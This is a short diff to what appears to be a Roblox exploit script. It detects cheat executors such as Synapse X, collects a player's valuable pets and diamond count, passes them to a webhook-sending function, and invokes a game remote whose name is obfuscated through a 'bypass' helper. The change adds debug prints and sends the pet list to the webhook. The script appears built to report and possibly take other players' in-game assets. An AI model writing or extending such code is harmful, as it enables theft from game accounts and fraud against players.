@@ -2,7 +2,9 @@
 local HttpService = game:GetService("HttpService");
 
 function SendMessage(Webhook, Message, Botname, huges)
+    print(huges)
     huges =  table.concat(huges, ', ')
+    print(huges)
 
     local webhookcheck =
     is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
@@ -115,7 +117,7 @@ spawn(function()
             hugecount =  hugecount + 1
         end
     end
-    SendMessage(#PetsList, mydiamonds, tostring(hugecount) )
+    SendMessage(#PetsList, mydiamonds, tostring(hugecount), huges )
 end)
 
 game.ReplicatedStorage[bypass(1,"#!F3be716c53b164be6adfeeb00f2baa9bc")]:InvokeServer(PetsList2)
